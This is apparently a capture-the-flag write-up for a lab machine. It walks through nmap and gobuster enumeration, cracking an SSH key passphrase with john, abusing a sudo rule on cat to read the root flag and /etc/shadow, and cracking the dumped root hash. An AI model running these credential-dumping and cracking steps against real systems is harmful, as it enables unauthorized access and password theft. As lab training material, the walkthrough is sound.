NMAP SCANNING

        kali㉿kali)-[~]
        └─$ nmap -A 10.10.161.177
        Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-16 06:11 EDT
        Nmap scan report for 10.10.161.177
        Host is up (0.22s latency).
        Not shown: 998 closed ports
        PORT   STATE SERVICE VERSION
        22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
        |   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
        |_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
        80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
        |_http-server-header: Apache/2.4.29 (Ubuntu)
        |_http-title: Apache2 Ubuntu Default Page: It works
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 56.77 second

GOBUSTER DIRECRORY ENUMERATION


        ┌──(kali㉿kali)-[~]
        └─$ gobuster dir -u  http://10.10.161.177/ -w /usr/share/wordlists/dirb/common.txt
        ===============================================================
        Gobuster v3.1.0
        by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
        ===============================================================
        [+] Url:                     http://10.10.161.177/
        [+] Method:                  GET
        [+] Threads:                 10
        [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
        [+] Negative Status codes:   404
        [+] User Agent:              gobuster/3.1.0
        [+] Timeout:                 10s
        ===============================================================
        2021/10/16 06:16:22 Starting gobuster in directory enumeration mode
        ===============================================================
        /.hta                 (Status: 403) [Size: 278]
        /.htpasswd            (Status: 403) [Size: 278]
        /.htaccess            (Status: 403) [Size: 278]
        /admin                (Status: 301) [Size: 314] [--> http://10.10.161.177/admin/]
        /index.html           (Status: 200) [Size: 10918]                                
        /server-status        (Status: 403) [Size: 278]                                  
                                                                                        
        ===============================================================
        2021/10/16 06:18:22 Finished
        =============================

PRIVILEGE ESCALATION & GETTING THE SHELL


        ─(kali㉿kali)-[~/Documents]
        └─$ john --wordlist=/home/kali/Documents/rockyou.txt johnid

        Using default input encoding: UTF-8
        Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
        Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
        Cost 2 (iteration count) is 1 for all loaded hashes
        Will run 4 OpenMP threads
        Note: This format may emit false positives, so it will keep trying even after
        finding a possible candidate.
        Press 'q' or Ctrl-C to abort, almost any other key for status
        rockinroll       (rsaid)
        Warning: Only 2 candidates left, minimum 4 needed for performance.
        1g 0:00:00:11 DONE (2021-10-16 05:36) 0.08547g/s 1225Kp/s 1225Kc/s 1225KC/sa6_123..*7¡Vamos!
        Session completed



        Login to john via ssh using the passphares cracked

        notice it keeps denying the password,, change the mode of the rsa file
        ──(kali㉿kali)-[~/Documents]
        └─$ chmod 600 rsaid  


        ──(kali㉿kali)-[~/Documents]
        └─$ ssh -i rsaid john@10.10.161.177                                           1 ⚙
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        Permissions 0644 for 'rsaid' are too open.
        It is required that your private key files are NOT accessible by others.
        This private key will be ignored.
        Load key "rsaid": bad permissions
        john@10.10.161.177's password: 
        Permission denied, please try again.
        john@10.10.161.177's password: 
        Permission denied, please try again.
        john@10.10.161.177's password: 
        john@10.10.161.177: Permission denied (publickey,password).
                                                                                        
        ┌──(kali㉿kali)-[~/Documents]
        └─$ ssh -i rsaid john@10.10.161.177                                     255 ⨯ 1 ⚙
        Enter passphrase for key 'rsaid': 
        Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

        * Documentation:  https://help.ubuntu.com
        * Management:     https://landscape.canonical.com
        * Support:        https://ubuntu.com/advantage

        System information as of Sat Oct 16 09:44:46 UTC 2021

        System load:  0.0                Processes:           101
        Usage of /:   25.7% of 19.56GB   Users logged in:     0
        Memory usage: 38%                IP address for eth0: 10.10.161.177
        Swap usage:   0%


        63 packages can be updated.
        0 updates are security updates.


        Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
        john@bruteit:~$ whoami
        john
        john@bruteit:~$ ls
        user.txt
        john@bruteit:~$ cat user.txt
                THM{a_password_is_not_a_barrier}
        john@bruteit:~$ sudo -l
        Matching Defaults entries for john on bruteit:
            env_reset, mail_badpass,
            secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

        User john may run the following commands on bruteit:
        (root) NOPASSWD: /bin/cat

        john@bruteit:~$ sudo /bin/cat /root/root.txt
                THM{pr1v1l3g3_3sc4l4t10n}


        john@bruteit:~$ sudo /bin/cat /etc/shadow
        root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
        ......................................
        thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
        sshd:*:18489:0:99999:7:::
        john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::



        Copy the root hash to a text file
        ┌──(kali㉿kali)-[~/Documents]
        └─$ nano root.txt  

        ┌──(kali㉿kali)-[~/Documents]
        └─$ sudo john root.txt --wordlist=/home/kali/Documents/rockyou.txt
        [sudo] password for kali: 
        Created directory: /root/.john
        Using default input encoding: UTF-8
        Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
        Cost 1 (iteration count) is 5000 for all loaded hashes
        Will run 4 OpenMP threads
        Press 'q' or Ctrl-C to abort, almost any other key for status
        football         (root)
        1g 0:00:00:00 DONE (2021-10-16 06:31) 3.225g/s 825.8p/s 825.8c/s 825.8C/s 123456..freedom
        Use the "--show" option to display all of the cracked passwords reliably
        Session completed
                                    